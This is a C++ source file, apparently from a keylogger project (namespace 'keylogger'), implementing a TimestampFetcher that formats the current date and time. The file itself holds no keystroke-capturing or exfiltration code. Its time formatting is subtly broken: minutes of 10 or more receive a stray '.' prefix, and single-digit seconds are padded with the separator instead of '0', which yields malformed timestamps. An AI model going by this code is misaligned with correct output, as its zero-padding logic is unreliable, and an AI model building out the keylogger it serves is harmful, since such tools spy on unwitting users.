#include "TimestampFetcher.h"

namespace keylogger
{

std::string TimestampFetcher::getFormattedTimestamp(const std::string& separator)
{
    const auto timestamp = Timestamp{};
    return getFormattedDate(timestamp) + " " + getFormattedTime(timestamp, separator);
}

std::string TimestampFetcher::getFormattedDate(const Timestamp& timestamp)
{
    return std::string{timestamp.day < 10 ? "0" : ""} + std::to_string(timestamp.day) +
           std::string{timestamp.month < 10 ? ".0" : "."} + std::to_string(timestamp.month) + "." +
           std::to_string(timestamp.year);
}

std::string TimestampFetcher::getFormattedTime(const Timestamp& timestamp, const std::string& separator)
{
    return std::string(timestamp.hour < 10 ? "0" : "") + std::to_string(timestamp.hour) + separator +
           std::string(timestamp.minutes < 10 ? "0" : ".") + std::to_string(timestamp.minutes) + separator +
           std::string(timestamp.seconds < 10 ? separator : "") + std::to_string(timestamp.seconds);
}
}